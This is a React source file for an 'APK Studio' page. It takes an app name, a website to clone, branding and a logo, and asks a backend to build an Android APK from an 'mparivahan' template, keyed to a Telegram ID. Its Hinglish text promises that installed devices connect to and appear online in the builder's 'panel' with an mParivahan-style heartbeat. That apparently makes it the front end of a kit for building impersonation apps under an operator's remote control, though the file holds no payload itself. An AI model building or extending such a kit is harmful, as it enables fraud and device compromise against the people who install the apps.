import { useState } from "react";
import { Layout } from "@/components/layout";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Badge } from "@/components/ui/badge";
import {
  Download,
  Smartphone,
  Upload,
  Shield,
  Loader2,
  Globe,
  Palette,
  Type,
  CheckCircle,
} from "lucide-react";
import { useAuth } from "@/lib/auth";
import { authHeaders } from "@/lib/apiFetch";
import { useToast } from "@/hooks/use-toast";

const API_BASE = (import.meta.env.VITE_API_URL ?? "").replace(/\/$/, "");

export function ApkStudio() {
  const { userId } = useAuth();
  const { toast } = useToast();
  const [appName, setAppName] = useState("");
  const [url, setUrl] = useState("");
  const [splashText, setSplashText] = useState("");
  const [themeColor, setThemeColor] = useState("#0d1b4b");
  const [iconData, setIconData] = useState("");
  const [building, setBuilding] = useState(false);
  const [result, setResult] = useState<{
    file: string;
    size: number;
    downloadUrl: string;
  } | null>(null);

  const onIcon = (e: React.ChangeEvent<HTMLInputElement>) => {
    const f = e.target.files?.[0];
    if (!f) return;
    if (!f.type.startsWith("image/")) {
      toast({
        title: "Invalid file",
        description: "Please upload an image (PNG/JPG).",
        variant: "destructive",
      });
      return;
    }
    if (f.size > 2 * 1024 * 1024) {
      toast({
        title: "Too large",
        description: "Logo must be under 2MB.",
        variant: "destructive",
      });
      return;
    }
    const reader = new FileReader();
    reader.onload = () => setIconData(String(reader.result));
    reader.readAsDataURL(f);
  };

  const build = async () => {
    if (!userId) {
      toast({ title: "Login required", variant: "destructive" });
      return;
    }
    if (!/^https?:\/\/[^\s]+$/i.test(url)) {
      toast({
        title: "Invalid URL",
        description: "Enter a valid http(s) website URL to clone.",
        variant: "destructive",
      });
      return;
    }
    setBuilding(true);
    setResult(null);
    try {
      const res = await fetch(`${API_BASE}/api/apk/custom-build`, {
        method: "POST",
        headers: { "Content-Type": "application/json", ...authHeaders() },
        body: JSON.stringify({
          telegramId: userId,
          appName: appName.trim(),
          url: url.trim(),
          splashText: splashText.trim(),
          themeColor: themeColor.replace("#", ""),
          orientation: "portrait",
          template: "mparivahan",
          iconData,
        }),
      });
      const d = await res.json();
      if (!res.ok) throw new Error(d.error || "Build failed");
      setResult(d);
      toast({
        title: "✅ APK built!",
        description: `${(d.size / 1024 / 1024).toFixed(1)} MB — ready to download`,
      });
    } catch (err: any) {
      toast({
        title: "Build failed",
        description: err.message,
        variant: "destructive",
      });
    } finally {
      setBuilding(false);
    }
  };

  const download = () => {
    if (!result) return;
    window.open(`${API_BASE}${result.downloadUrl}`, "_blank");
  };

  return (
    <Layout>
      <div className="max-w-3xl mx-auto py-6 space-y-6">
        <div className="flex items-center justify-between">
          <div>
            <h1 className="text-2xl font-bold text-foreground flex items-center gap-2">
              <Smartphone className="w-6 h-6 text-primary" /> APK Studio
            </h1>
            <p className="text-sm text-muted-foreground mt-1">
              Kisi bhi website ka branded custom APK banao — device aapke panel
              se connect hoga
            </p>
          </div>
          <Badge className="bg-primary/10 text-primary border border-primary/20">
            Custom Build
          </Badge>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
          <div className="bg-card border border-card-border rounded-2xl p-5 space-y-4">
            <div className="space-y-2">
              <Label className="flex items-center gap-1.5">
                <Type className="w-3.5 h-3.5" /> App Name
              </Label>
              <Input
                value={appName}
                onChange={(e) => setAppName(e.target.value)}
                placeholder="e.g. MyApp"
                maxLength={28}
              />
            </div>
            <div className="space-y-2">
              <Label className="flex items-center gap-1.5">
                <Globe className="w-3.5 h-3.5" /> Clone Website URL
              </Label>
              <Input
                value={url}
                onChange={(e) => setUrl(e.target.value)}
                placeholder="https://example.com"
              />
            </div>
            <div className="space-y-2">
              <Label className="flex items-center gap-1.5">
                <Type className="w-3.5 h-3.5" /> Splash Text
              </Label>
              <Input
                value={splashText}
                onChange={(e) => setSplashText(e.target.value)}
                placeholder="Powered by YOUR BRAND"
                maxLength={60}
              />
            </div>
            <div className="space-y-2">
              <Label className="flex items-center gap-1.5">
                <Palette className="w-3.5 h-3.5" /> Theme Color
              </Label>
              <div className="flex items-center gap-2">
                <input
                  type="color"
                  value={themeColor}
                  onChange={(e) => setThemeColor(e.target.value)}
                  className="w-10 h-10 rounded-lg border border-card-border cursor-pointer bg-transparent"
                />
                <span className="text-sm font-mono text-muted-foreground">
                  {themeColor}
                </span>
              </div>
            </div>
            <div className="space-y-2">
              <Label className="flex items-center gap-1.5">
                <Upload className="w-3.5 h-3.5" /> App Logo (optional)
              </Label>
              <Input
                type="file"
                accept="image/*"
                onChange={onIcon}
                className="cursor-pointer"
              />
              {iconData && (
                <p className="text-xs text-success flex items-center gap-1">
                  <CheckCircle className="w-3.5 h-3.5" /> Logo uploaded
                </p>
              )}
            </div>
            <Button
              onClick={build}
              disabled={building}
              className="w-full bg-primary hover:bg-primary/90"
            >
              {building ? (
                <>
                  <Loader2 className="w-4 h-4 animate-spin mr-2" /> Building (~2
                  min)...
                </>
              ) : (
                <>
                  <Smartphone className="w-4 h-4 mr-2" /> Build Custom APK
                </>
              )}
            </Button>
          </div>

          <div className="space-y-4">
            <div className="bg-card border border-card-border rounded-2xl p-5">
              <h3 className="font-semibold text-foreground mb-2 flex items-center gap-2">
                <Shield className="w-4 h-4 text-primary" /> Kya milega
              </h3>
              <ul className="text-sm text-muted-foreground space-y-1.5 list-disc pl-4">
                <li>Aapke logo + app name ke saath branded APK</li>
                <li>Clone URL website app mein khulegi (WebView)</li>
                <li>Device aapke panel mein online dikhega</li>
                <li>mParivahan jaisa heartbeat + device connect</li>
                <li>Har user apna custom APK bana sakta hai</li>
              </ul>
            </div>
            {result && (
              <div className="bg-success/10 border border-success/30 rounded-2xl p-5">
                <h3 className="font-semibold text-success mb-2 flex items-center gap-2">
                  <CheckCircle className="w-4 h-4" /> APK Ready!
                </h3>
                <p className="text-sm text-muted-foreground mb-3">
                  Size: {(result.size / 1024 / 1024).toFixed(1)} MB
                </p>
                <Button
                  onClick={download}
                  className="w-full bg-success hover:bg-success/90 text-white"
                >
                  <Download className="w-4 h-4 mr-2" /> Download APK
                </Button>
              </div>
            )}
          </div>
        </div>
      </div>
    </Layout>
  );
}
